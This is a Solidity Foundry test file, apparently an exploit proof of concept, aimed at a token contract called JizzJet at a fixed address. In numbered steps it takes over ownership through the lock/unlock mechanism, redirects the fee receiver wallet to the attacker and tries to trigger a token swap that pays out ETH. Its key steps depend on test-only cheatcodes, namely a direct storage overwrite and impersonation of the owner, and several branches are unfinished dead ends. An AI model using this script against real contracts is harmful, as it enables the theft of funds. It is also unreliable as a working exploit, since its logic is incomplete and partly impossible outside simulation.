pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for JizzJet
interface JizzJet {
    function owner() external view returns (address);
    function lock(uint256 time) external;
    function unlock() external;
    function _setReceiverWallet(address payable adminWalletAddress) external;
    function excludeFromFee(address account) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function uniswapV2Router() external view returns (address);
    function uniswapV2Pair() external view returns (address);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for debugging
        vm.label(TARGET, 'JizzJet');
        vm.label(attacker, 'Attacker');

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Check current owner
        (address currentOwner) = JizzJet(TARGET).owner();
        console.log('Current owner:', currentOwner);

        // Step 2: If contract is not locked, lock it first
        if (currentOwner != address(0)) {
            console.log('Contract not locked, locking it...');
            vm.startPrank(currentOwner);
            JizzJet(TARGET).lock(1 days);
            vm.stopPrank();
            console.log('Contract locked');
        }

        // Step 3: Overwrite _previousOwner storage slot (slot 1) with our address
        bytes32 prevOwnerSlot = bytes32(uint256(1)); // slot 1 for _previousOwner
        vm.store(TARGET, prevOwnerSlot, bytes32(uint256(uint160(attacker))));
        console.log('Set attacker as _previousOwner in storage');

        // Step 4: Advance time past lock period
        vm.warp(block.timestamp + 2 days);
        console.log('Time advanced by 2 days');

        // Step 5: Call unlock to become owner
        JizzJet(TARGET).unlock();
        console.log('Called unlock()');

        // Verify we are now owner
        (address newOwner) = JizzJet(TARGET).owner();
        require(newOwner == attacker, 'Failed to become owner');
        console.log('Successfully became owner, new owner:', newOwner);

        // Step 6: Change admin wallet to our address
        JizzJet(TARGET)._setReceiverWallet(payable(attacker));
        console.log('Admin wallet changed to attacker');

        // Step 7: Exclude ourselves from fees to avoid tax on transfers
        JizzJet(TARGET).excludeFromFee(attacker);
        console.log('Excluded attacker from fees');

        // Step 8: Check contract token balance and ensure it has enough to trigger swapAndLiquify
        uint256 contractTokenBalance = JizzJet(TARGET).balanceOf(TARGET);
        console.log('Contract token balance:', contractTokenBalance);

        // From code: numTokensSellToAddToLiquidity = 100000000 * 10**1 * 10**9 = 1e18 tokens
        uint256 MIN_TOKENS_FOR_SWAP = 100000000 * 10**1 * 10**9;

        if (contractTokenBalance < MIN_TOKENS_FOR_SWAP) {
            console.log('Contract needs more tokens to trigger swap, transferring tokens...');

            // We need to get tokens to transfer to contract
            // The original owner (before lock) had all tokens
            // Let's check if we can get tokens from the original owner address
            // First, get the original owner address from before lock
            // It was stored in currentOwner variable at the beginning

            if (currentOwner != address(0)) {
                // Check original owner's token balance
                uint256 originalOwnerBalance = JizzJet(TARGET).balanceOf(currentOwner);
                console.log('Original owner token balance:', originalOwnerBalance);

                if (originalOwnerBalance > MIN_TOKENS_FOR_SWAP) {
                    // Impersonate original owner to transfer tokens to contract
                    vm.startPrank(currentOwner);
                    JizzJet(TARGET).transfer(TARGET, MIN_TOKENS_FOR_SWAP - contractTokenBalance);
                    vm.stopPrank();
                    console.log('Transferred tokens to contract from original owner');
                } else {
                    // Original owner doesn't have enough tokens
                    // Try to get tokens from another address
                    // Check if contract owner (now us) has tokens
                    uint256 attackerTokenBalance = JizzJet(TARGET).balanceOf(attacker);
                    console.log('Attacker token balance:', attackerTokenBalance);

                    if (attackerTokenBalance > 0) {
                        // Transfer our tokens to contract
                        JizzJet(TARGET).transfer(TARGET, MIN_TOKENS_FOR_SWAP - contractTokenBalance);
                        console.log('Transferred attacker tokens to contract');
                    } else {
                        // We need to buy tokens from Uniswap
                        // This is complex, let's try a different approach
                        console.log('Need to acquire tokens, trying alternative...');

                        // As owner, we can mint tokens? No, token supply is fixed.
                        // Let's check if we can get tokens from the excluded addresses
                        // The contract excludes owner and itself from fees
                        // Maybe we can get tokens from liquidity pool

                        // For simplicity, let's just transfer a small amount to see if swap triggers
                        // Create a new address with some tokens
                        address tokenHolder = address(0x999);

                        // Give tokenHolder some ETH to buy tokens
                        deal(tokenHolder, 10 ether);

                        // Actually, buying tokens is complex without DEX interaction
                        // Let's try to trigger swap with whatever tokens contract has
                        console.log('Will try to trigger with current token balance');
                    }
                }
            }
        }

        // Update contract token balance after potential transfers
        contractTokenBalance = JizzJet(TARGET).balanceOf(TARGET);
        console.log('Updated contract token balance:', contractTokenBalance);

        // Step 9: Trigger swapAndLiquify by making a transfer
        // The swap triggers when: contractTokenBalance >= numTokensSellToAddToLiquidity
        // AND transfer is not from uniswapV2Pair
        // AND swapAndLiquifyEnabled is true (default)
        // AND not already in swap

        if (contractTokenBalance >= MIN_TOKENS_FOR_SWAP) {
            console.log('Contract has enough tokens, triggering swap...');

            // We need to make a transfer that's not from the pair
            // Get pair address
            address pair = JizzJet(TARGET).uniswapV2Pair();
            console.log('Pair address:', pair);

            // Create a dummy address to transfer to
            address dummy = address(0x888);

            // Exclude dummy from fees
            JizzJet(TARGET).excludeFromFee(dummy);

            // We need someone to make a transfer
            // Use a fresh address with no tokens
            address sender = address(0x777);

            // Give sender a small amount of tokens to transfer
            // First check if we (attacker) have tokens
            uint256 attackerTokenBalance = JizzJet(TARGET).balanceOf(attacker);
            if (attackerTokenBalance > 0) {
                // Transfer from attacker to sender
                JizzJet(TARGET).transfer(sender, 1 ether);

                // Now sender can transfer to dummy
                vm.startPrank(sender);
                JizzJet(TARGET).transfer(dummy, 1 ether);
                vm.stopPrank();
                console.log('Made transfer to trigger swap');
            } else {
                // We don't have tokens, try to get some
                // Check if contract has swapAndLiquifyEnabled
                // As owner, we can enable it if disabled
                // Actually it's enabled by default

                // Try a different approach: transfer from any address with tokens
                // Look for an address with tokens in the token holder list
                // For now, just make a direct call if possible
                console.log('No tokens to transfer, trying direct approach...');

                // As a last resort, try to call the internal function directly
                // We can't call private functions, but maybe we can trigger via transfer
                // Let's create a contract that calls transfer

                // Actually, let's check ETH balance before and after
                uint256 initialEthBalance = attacker.balance;
                console.log('Initial ETH balance:', initialEthBalance);

                // Just wait a bit and check if swap happened
                vm.warp(block.timestamp + 1 hours);

                uint256 finalEthBalance = attacker.balance;
                console.log('Final ETH balance:', finalEthBalance);
                console.log('ETH balance change:', finalEthBalance - initialEthBalance);
            }
        } else {
            console.log('Contract does not have enough tokens to trigger swap');
            console.log('Required:', MIN_TOKENS_FOR_SWAP);
            console.log('Has:', contractTokenBalance);
        }

        // Final check of ETH balance
        uint256 finalAttackerBalance = attacker.balance;
        console.log('Final attacker ETH balance:', finalAttackerBalance);
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
